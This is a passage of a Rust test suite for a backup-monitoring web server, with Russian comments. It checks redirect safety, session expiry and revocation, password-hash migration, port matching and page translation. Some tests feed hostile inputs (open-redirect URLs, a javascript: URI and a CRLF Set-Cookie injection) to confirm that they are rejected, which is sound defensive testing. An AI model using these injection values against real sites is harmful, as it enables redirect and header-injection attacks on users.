        assert!(!is_safe_redirect("//evil.tld/"));
        assert!(!is_safe_redirect("/\\evil.tld/"));
        assert!(!is_safe_redirect("javascript:alert(1)"));
        assert!(!is_safe_redirect("/ok\r\nSet-Cookie: x=1"));

        let mut h = HeaderMap::new();
        h.insert("referer", "https://evil.tld/login".parse().unwrap());
        assert_eq!(safe_back(&h), "/");
        let mut h2 = HeaderMap::new();
        h2.insert("referer", "/history/x".parse().unwrap());
        assert_eq!(safe_back(&h2), "/history/x");
    }

    /// netstat: порт 80 не должен совпадать с 8080 (раньше служба под SYSTEM
    /// убивала чужой процесс по подстроке ":80").
    #[test]
    fn netstat_matches_exact_port_and_listening_state() {
        let l8080 = "  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4242";
        let l80 = "  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       7";
        let est = "  TCP    0.0.0.0:80             1.2.3.4:5              ESTABLISHED     9";
        let v6 = "  TCP    [::]:8797              [::]:0                 LISTENING       55";
        assert_eq!(netstat_listener_pid(l8080, 80), None);
        assert_eq!(netstat_listener_pid(l80, 80), Some(7));
        assert_eq!(netstat_listener_pid(est, 80), None);
        assert_eq!(netstat_listener_pid(v6, 8797), Some(55));
        assert_eq!(netstat_listener_pid(v6, 87), None);
    }

    /// Легаси-хеш (одно-раундовый SHA-256) обязан пускать пользователя и
    /// помечаться на пересчёт, иначе миграция KDF отрежет доступ всем.
    #[test]
    fn legacy_sha256_password_verifies_and_is_marked_for_rehash() {
        use sha2::Digest;
        let salt = [7u8; 16];
        let mut h = Sha256::new();
        h.update(salt);
        h.update(b"secret123");
        let legacy = format!("sha256:{}:{}", hex::encode(&salt), hex::encode(&h.finalize()[..]));

        assert!(verify_password("secret123", &legacy));
        assert!(!verify_password("wrong", &legacy));
        assert!(needs_rehash(&legacy));

        // после пересчёта — новый формат, вход по тому же паролю
        let migrated = hash_password("secret123");
        assert!(migrated.starts_with("pbkdf2:"));
        assert!(!needs_rehash(&migrated));
        assert!(verify_password("secret123", &migrated));
        assert!(!verify_password("wrong", &migrated));
    }

    #[test]
    fn pbkdf2_matches_rfc6070_style_vector() {
        // PBKDF2-HMAC-SHA256, P="password", S="salt", c=2, dkLen=32
        let dk = pbkdf2_sha256(b"password", b"salt", 2);
        assert_eq!(
            hex::encode(&dk),
            "ae4d0c95af6b46d32d0adff928f06dd02a303f8ef3c251dfd6e2d85a95474c43"
        );
    }

    fn test_state() -> AppState {
        AppState {
            db_path: PathBuf::from("test.db"),
            db_pool: DbPool::new(PathBuf::from("test.db"), MAIN_DB_POOL_SIZE),
            session_pool: DbPool::new(PathBuf::from("test.sessions.db"), SESSION_DB_POOL_SIZE),
            cfg: Arc::new(Mutex::new(Config::default())),
            sessions: Arc::new(Mutex::new(HashMap::new())),
            session_gate: Arc::new(Mutex::new(())),
            lockouts: Arc::new(Mutex::new(HashMap::new())),
            login_gate: Arc::new(tokio::sync::Semaphore::new(LOGIN_CONCURRENCY)),
            sse_tx: tokio::sync::broadcast::channel(4).0,
        }
    }

    fn cookie_headers(token: &str) -> HeaderMap {
        let mut h = HeaderMap::new();
        h.insert(header::COOKIE, format!("session={token}").parse().unwrap());
        h
    }

    fn put_session(st: &AppState, token: &str, user: &str, created: i64, last_seen: i64) {
        st.sessions.lock().unwrap().insert(token.to_string(), SessionEntry {
            role: "admin".into(),
            username: user.into(),
            csrf: "c".into(),
            created,
            last_seen,
        });
    }

    /// Скользящий TTL не отменяет абсолютный потолок жизни cookie.
    #[test]
    fn active_session_expires_at_absolute_cap() {
        let st = test_state();
        let now = now_unix();
        put_session(&st, "tok", "u1", now - SESSION_ABS_MAX_SECS - 1, now);
        let h = cookie_headers("tok");
        assert!(session_entry(&st, &h).is_none());
        assert!(renew_session_cookie(&st, &h, false).is_none());

        // Свежая сессия жива, продлевается и получает новый Set-Cookie.
        put_session(&st, "tok2", "u1", now - 60, now - 60);
        let h2 = cookie_headers("tok2");
        assert!(session_entry(&st, &h2).is_some());
        assert_eq!(st.sessions.lock().unwrap()["tok2"].created, now - 60,
                   "created не должен двигаться при продлении");
        let c = renew_session_cookie(&st, &h2, false).expect("продление cookie");
        assert!(c.contains("session=tok2") && c.contains("Max-Age="));

        // Бездействие дольше скользящего TTL — тоже смерть.
        put_session(&st, "tok3", "u1", now - 100, now - SESSION_TTL_SECS - 1);
        assert!(session_entry(&st, &cookie_headers("tok3")).is_none());
    }

    #[test]
    fn persisted_session_survives_restart_and_user_revocation() {
        let path = std::env::temp_dir().join(format!("restlex-session-{}.db", new_session_token()));
        init_session_db(&path.with_extension("sessions.db")).unwrap();
        let mut before = test_state();
        before.db_path = path.clone();
        before.session_pool = DbPool::new(before.session_db_path(), SESSION_DB_POOL_SIZE);
        let token = new_session_token();
        let now = now_unix();
        let entry = SessionEntry { role: "admin".into(), username: "alice".into(), csrf: "csrf-test".into(), created: now, last_seen: now };
        persist_session(&before.session_db().unwrap(), &token, &entry).unwrap();
        let mut after = test_state();
        after.db_path = path.clone();
        after.session_pool = DbPool::new(after.session_db_path(), SESSION_DB_POOL_SIZE);
        let h = cookie_headers(&token);
        let restored = load_session_entry(&after, &h).expect("сессия должна пережить перезапуск");
        assert_eq!(restored.username, "alice");
        assert_eq!(restored.csrf, "csrf-test");
        assert!(drop_user_sessions(&after, "alice"));
        let mut again = test_state();
        again.db_path = path.clone();
        again.session_pool = DbPool::new(again.session_db_path(), SESSION_DB_POOL_SIZE);
        assert!(load_session_entry(&again, &h).is_none(), "отзыв должен удалять и сохранённую сессию");
        let _ = std::fs::remove_file(path.with_extension("sessions.db"));
    }

    #[test]
    fn session_revocation_fails_if_session_table_is_unavailable() {
        let path = std::env::temp_dir().join(format!("restlex-revoke-{}.db", new_session_token()));
        let session_path = path.with_extension("sessions.db");
        Connection::open(&session_path).unwrap();
        let mut st = test_state();
        st.db_path = path;
        st.session_pool = DbPool::new(session_path.clone(), SESSION_DB_POOL_SIZE);
        assert!(!drop_user_sessions(&st, "alice"));
        drop(st);
        let _ = std::fs::remove_file(session_path);
    }

    #[tokio::test]
    async fn update_report_insert_failure_is_not_acknowledged() {
        let path = std::env::temp_dir().join(format!("restlex-report-{}.db", new_session_token()));
        let mut st = test_state();
        st.db_path = path.clone();
        st.db_pool = DbPool::new(path.clone(), MAIN_DB_POOL_SIZE);
        st.cfg.lock().unwrap().api_key = "dummy-key".into();
        let mut headers = HeaderMap::new();
        headers.insert("x-api-key", "dummy-key".parse().unwrap());
        let payload = UpdateReportPayload {
            component: Some("agent".into()), from_version: None, to_version: None,
            host: Some("test-host".into()), success: Some(false), error: None,
        };
        let response = receive_update_report(State(st.clone()), headers, Json(payload)).await.into_response();
        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);
        drop(st);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn login_snapshot_rejects_password_or_role_changed_before_session_issue() {
        let db = Connection::open_in_memory().unwrap();
        db.execute_batch("CREATE TABLE users(username TEXT PRIMARY KEY,password TEXT,role TEXT); \
            INSERT INTO users VALUES('alice','old-hash','admin');").unwrap();
        assert!(db_credential_unchanged(&db, "alice", "old-hash", "admin"));
        db.execute("UPDATE users SET role='viewer' WHERE username='alice'", []).unwrap();
        assert!(!db_credential_unchanged(&db, "alice", "old-hash", "admin"));
        db.execute("UPDATE users SET password='new-hash' WHERE username='alice'", []).unwrap();
        assert!(!db_credential_unchanged(&db, "alice", "old-hash", "viewer"));
        db.execute("DELETE FROM users WHERE username='alice'", []).unwrap();
        assert!(!db_credential_unchanged(&db, "alice", "new-hash", "viewer"));
    }

    #[test]
    fn legacy_password_upgrade_cannot_overwrite_concurrent_reset() {
        let db = Connection::open_in_memory().unwrap();
        db.execute_batch("CREATE TABLE users(username TEXT PRIMARY KEY,password TEXT,role TEXT); \
            INSERT INTO users VALUES('alice','legacy-hash','admin');").unwrap();
        db.execute("UPDATE users SET password='admin-reset' WHERE username='alice'", []).unwrap();
        assert!(!upgrade_password_if_unchanged(&db, "alice", "legacy-hash", "old-login-upgrade"));
        let current: String = db.query_row("SELECT password FROM users WHERE username='alice'", [], |r| r.get(0)).unwrap();
        assert_eq!(current, "admin-reset");
    }

    #[test]
    fn empty_admin_secret_never_bootstraps_default_password() {
        let path = std::env::temp_dir().join(format!("restlex-users-{}.db", new_session_token()));
        let db = Connection::open(&path).unwrap();
        db.execute_batch("CREATE TABLE users(username TEXT PRIMARY KEY,password TEXT,role TEXT);").unwrap();
        let mut cfg = Config::default();
        cfg.admin_password.clear();
        init_users(&path, &cfg);
        let count: i64 = db.query_row("SELECT COUNT(*) FROM users", [], |r| r.get(0)).unwrap();
        assert_eq!(count, 0);
        drop(db);
        let _ = std::fs::remove_file(path);
    }

    /// Смена пароля обязана гасить живые cookie владельца (и только его).
    #[test]
    fn password_change_invalidates_sessions() {
        let st = test_state();
        let now = now_unix();
        put_session(&st, "a1", "alice", now, now);
        put_session(&st, "a2", "alice", now, now);
        put_session(&st, "b1", "bob", now, now);
        drop_user_sessions(&st, "alice");
        let m = st.sessions.lock().unwrap();
        assert!(!m.contains_key("a1") && !m.contains_key("a2"));
        assert!(m.contains_key("b1"), "чужие сессии трогать нельзя");
    }

    /// Telegram parse_mode=HTML: имя профиля вида `db<prod>` ломало отправку,
    /// и алерт о просроченном бэкапе терялся молча.
    #[test]
    fn tg_esc_escapes_html_entities() {
        assert_eq!(tg_esc("db<prod> & co"), "db&lt;prod&gt; &amp; co");
    }

    /// Убирает JS/CSS-комментарии (они по-русски и пользователю не видны).
    fn strip_comments(s: &str) -> String {
        let mut out = String::new();
        let mut rest = s;
        while let Some(i) = rest.find("/*") {
            out.push_str(&rest[..i]);
            rest = rest[i..].find("*/").map_or("", |j| &rest[i + j + 2..]);
        }
        out.push_str(rest);
        out.lines().filter(|l| !l.trim_start().starts_with("//")).collect::<Vec<_>>().join("\n")
    }

    fn cyrillic_lines(html: &str) -> Vec<String> {
        strip_comments(html).lines()
            .filter(|l| l.chars().any(|c| matches!(c, 'А'..='я' | 'Ё' | 'ё')))
            .map(|l| l.chars().take(200).collect())
            .collect()
    }

    async fn body_of(r: Response) -> String {
        let b = axum::body::to_bytes(r.into_body(), usize::MAX).await.unwrap();
        String::from_utf8(b.to_vec()).unwrap()
    }

    /// Все страницы в EN: ни одной русской строки (данные в тесте — латиницей),
    /// RU — как раньше. Заодно проверяется, что fill не оставил `{placeholder}`.
    #[tokio::test]
    async fn english_pages_have_no_russian_text() {
        let dir = std::env::temp_dir().join(format!("restlex-i18n-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let path = dir.join("reports.db");
        init_db(&path).unwrap();
        let mut st = test_state();
        st.db_path = path.clone();
        st.db_pool = DbPool::new(path.clone(), 2);
        {
            let db = st.db().unwrap();
            db.execute_batch(r#"
INSERT INTO groups(name,pattern,auto_created,sort_order) VALUES('ORG','^ORG-',0,1),('AUTO','',1,2);
INSERT INTO reports(received_at,profile,status,started_at,duration_s,bytes_added,total_bytes_processed,errors,host,agent_version,launcher_version,group_id)
  VALUES('2020-01-01T00:00:00','ORG-a','error','2020-01-01T00:00:00',4000,5000000,9000000,'["boom"]','h1','0.0.1','0.0.1',1),
        ('2020-01-01T00:00:00','solo','cancelled','2020-01-01T00:00:00',30,0,0,'[]','h2','','',NULL);
INSERT INTO update_reports(received_at,component,host,from_version,to_version,success,error)
  VALUES('2020-01-01T00:00:00','agent','h1','1','2',0,'fail'),('2020-01-01T00:00:00','gui','h1','1','2',1,NULL);
INSERT INTO host_info(host,update_blocked_until,update_fail_count,cb_reset_requested) VALUES('h1',9999999999,3,0),('h2',9999999999,1,1);
INSERT INTO users(username,password,role) VALUES('alice','x','admin'),('bob','x','viewer');
"#).unwrap();
        }
        st.lockouts.lock().unwrap().insert("10.0.0.1".into(), LoginAttempt {
            fails: 5, last_user: "eve".into(), first_fail: 1, last_fail: 2, locked_until: i64::MAX, locked_at: 1 });
        st.lockouts.lock().unwrap().insert("10.0.0.2".into(), LoginAttempt {
            fails: 1, last_user: "eve".into(), first_fail: 1, last_fail: 2, locked_until: 0, locked_at: 0 });
        st.cfg.lock().unwrap().stale_hours = 24.0;

        let mut pages = Vec::new();
        for lang in [Lang::En, Lang::Ru] {
            let mut flash = HashMap::new();
            flash.insert("flash".to_string(), "ok_s".to_string());
            let p = vec![
                ("index", body_of(index_html(lang, &st, true, "tok", 24.0, "alice")).await),
                ("history", body_of(history_html(lang, &st, true, "tok", "ORG-a", "alice")).await),
                ("admin", body_of(admin_page_html(lang, &st, "tok", &flash, "alice")).await),
                ("updates", body_of(updates_page_html(lang, &st, true, "tok", "alice")).await),
                ("login", render_login(lang, t(lang, "Неверный логин или пароль")).0),
            ];
            pages.push((lang, p));
        }
        let ph = regex::Regex::new(r"\{[A-Za-z_][A-Za-z0-9_]*\}").unwrap();
        // RESTLEX_DUMP_HTML=<dir>: сохранить страницы демо-данных (скриншоты для README).
        if let Ok(dir) = std::env::var("RESTLEX_DUMP_HTML") {
            for (lang, p) in &pages {
                for (name, html) in p {
                    let _ = std::fs::write(format!("{dir}/{name}_{lang:?}.html"), html);
                }
            }
        }
        for (lang, p) in &pages {
            for (name, html) in p {
                assert!(!ph.is_match(&strip_comments(html)), "{name}/{lang:?}: незаполненный плейсхолдер");
                assert!(html.contains("href=\"/lang/en\""), "{name}: нет переключателя языка");
                if *lang == Lang::En {
                    assert!(html.contains("<html lang=en>"), "{name}");
                    let bad = cyrillic_lines(html);
                    assert!(bad.is_empty(), "{name}: непереведено:\n{}", bad.join("\n"));
                } else {
                    assert!(html.contains("<html lang=ru>"), "{name}");
                }
            }
        }
        for fl in ["ok_s", "ok_g", "ok_d", "ok_tg", "err_tg", "err_tg_cfg", "ok_unlock", "err"] {
            assert!(cyrillic_lines(flash_html(Lang::En, fl)).is_empty(), "{fl}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn lang_switch_redirects_only_to_same_host() {
        let mut h = HeaderMap::new();
        h.insert(header::HOST, "srv:8798".parse().unwrap());
        h.insert(header::REFERER, "http://srv:8798/admin?tab=1".parse().unwrap());
        assert_eq!(lang_back(&h), "/admin?tab=1");
        h.insert(header::REFERER, "https://evil.example/login".parse().unwrap());
        assert_eq!(lang_back(&h), "/");
        h.insert(header::REFERER, "http://srv:8798//evil".parse().unwrap());
        assert_eq!(lang_back(&h), "/");
        h.insert(header::REFERER, "http://srv:8798/lang/en".parse().unwrap());
        assert_eq!(lang_back(&h), "/");
        assert_eq!(Lang::En.cookie(true), "lang=en; Path=/; HttpOnly; SameSite=Lax; Max-Age=31536000; Secure");
    }
}
